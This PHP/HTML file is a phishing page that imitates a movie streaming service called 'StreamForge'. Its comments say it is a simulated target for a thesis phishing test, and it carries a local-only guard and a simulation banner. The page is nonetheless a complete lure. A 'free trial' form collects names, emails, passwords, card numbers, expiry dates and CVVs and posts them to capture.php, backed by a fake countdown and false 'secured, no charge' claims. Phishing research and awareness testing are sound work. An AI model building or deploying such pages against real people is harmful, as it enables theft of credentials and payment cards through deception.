<?php
// site2 — fake "StreamForge" movie streaming service. Real catalogue via TMDB.
// The "start free trial" form harvests login + card-style data (simulation).
require __DIR__ . '/lib.php';
require_local();
$movies = fetch_movies();
function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<!-- x-educational-simulation: CyberForge thesis phishing test target (fictional streaming brand) -->
<title>StreamForge — Watch unlimited movies</title>
<style>
  *{box-sizing:border-box}
  body{margin:0;font-family:Segoe UI,system-ui,Arial,sans-serif;background:#0a0d14;color:#eaf0f7;padding-bottom:44px}
  .nav{display:flex;align-items:center;gap:14px;padding:14px 26px;background:#0d1119;border-bottom:1px solid #1c2535;position:sticky;top:0;z-index:5}
  .brand{font-weight:800;font-size:20px;color:#ff5b3a;letter-spacing:-.5px}
  .brand span{color:#eaf0f7}
  .nav .cta{margin-left:auto;background:#ff5b3a;color:#fff;border:0;border-radius:7px;padding:9px 16px;font-weight:700;cursor:pointer}
  .hero{padding:40px 26px 8px}
  .hero h1{font-size:30px;margin:0 0 8px}
  .hero p{color:#9fb0c6;margin:0 0 18px;font-size:15px}
  .pill{display:inline-block;background:#16202f;border:1px solid #24344a;color:#9fd0ff;font-size:12px;border-radius:20px;padding:5px 12px;margin-bottom:14px}
  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px;padding:18px 26px}
  .movie{background:#111726;border:1px solid #1c2535;border-radius:10px;overflow:hidden;cursor:pointer;transition:transform .15s}
  .movie:hover{transform:translateY(-3px)}
  .poster{aspect-ratio:2/3;background:linear-gradient(160deg,#1b2740,#0e1626);display:grid;place-items:center;color:#5a6b82;font-size:13px;text-align:center;padding:10px}
  .poster img{width:100%;height:100%;object-fit:cover}
  .mt{padding:9px 10px}
  .mt b{font-size:13px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
  .mt span{font-size:11px;color:#8aa0bd}
  /* trial modal */
  .scrim{position:fixed;inset:0;background:rgba(4,7,12,.72);display:none;place-items:center;z-index:20;padding:16px}
  .scrim.on{display:grid}
  .modal{width:100%;max-width:420px;background:#0f1522;border:1px solid #243349;border-radius:14px;padding:24px}
  .modal h2{margin:0 0 4px;font-size:20px}
  .modal .s{color:#9fb0c6;font-size:13px;margin:0 0 16px}
  label{display:block;font-size:12px;font-weight:600;margin:12px 0 5px;color:#c4d2e4}
  input,select{width:100%;height:42px;padding:0 12px;border:1px solid #2a3a52;border-radius:8px;background:#0a1019;color:#eaf0f7;font-size:14px}
  .two{display:flex;gap:10px}
  .btn{width:100%;height:46px;margin-top:18px;border:0;border-radius:8px;background:#ff5b3a;color:#fff;font-weight:700;font-size:15px;cursor:pointer}
  .secure{display:flex;gap:7px;align-items:center;justify-content:center;color:#56b870;font-size:11.5px;margin-top:12px}
  .urgent{background:#2a1212;border:1px solid #5a2020;color:#ffb0b0;border-radius:8px;padding:9px 11px;font-size:12.5px;margin-bottom:14px}
</style>
</head>
<body>
  <div class="nav">
    <div class="brand">Stream<span>Forge</span></div>
    <button class="cta" onclick="openTrial()">Start Free Trial</button>
  </div>

  <div class="hero">
    <span class="pill">★ Limited offer — 7 days free, then $0.00 today</span>
    <h1>Unlimited movies &amp; shows. Anywhere.</h1>
    <p>Stream thousands of titles in 4K. Start your free trial — verify your card to unlock instant playback.</p>
  </div>

  <div class="grid">
    <?php foreach ($movies as $m): ?>
      <div class="movie" onclick="openTrial()">
        <div class="poster">
          <?php if (!empty($m['poster'])): ?>
            <img src="<?= h($m['poster']) ?>" alt="<?= h($m['title']) ?>" loading="lazy" />
          <?php else: ?><?= h($m['title']) ?><?php endif; ?>
        </div>
        <div class="mt"><b><?= h($m['title']) ?></b><span>★ <?= h(number_format((float)$m['rating'],1)) ?> · <?= h($m['year']) ?></span></div>
      </div>
    <?php endforeach; ?>
  </div>

  <div class="scrim" id="scrim">
    <div class="modal">
      <h2>Start your free trial</h2>
      <p class="s">No charge today. Verify your details to begin watching instantly.</p>
      <div class="urgent">⏳ Your free trial slot is reserved for 09:58. Complete sign-up to keep it.</div>
      <form method="post" action="capture.php" autocomplete="off">
        <label>Full name</label>
        <input name="full_name" required placeholder="Alex Carter" />
        <label>Email</label>
        <input name="email" type="email" required placeholder="you@example.test" />
        <label>Create password</label>
        <input name="password" type="password" required placeholder="••••••••" />
        <label>Plan</label>
        <select name="plan"><option>Premium 4K — free 7 days</option><option>Standard HD — free 7 days</option></select>
        <label>Card number (verification only)</label>
        <input name="card_number" inputmode="numeric" placeholder="4242 4242 4242 4242" required />
        <div class="two">
          <div style="flex:1"><label>Expiry</label><input name="card_exp" placeholder="MM/YY" required /></div>
          <div style="width:110px"><label>CVV</label><input name="card_cvv" inputmode="numeric" placeholder="123" required /></div>
        </div>
        <button class="btn" type="submit">Start watching</button>
        <div class="secure">
          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="11" width="16" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></svg>
          Secured · you won't be charged during the trial
        </div>
      </form>
    </div>
  </div>

  <?= sim_banner() ?>
  <script>
    function openTrial(){ document.getElementById('scrim').classList.add('on'); }
    document.getElementById('scrim').addEventListener('click', function(e){ if(e.target===this) this.classList.remove('on'); });
  </script>
</body>
</html>
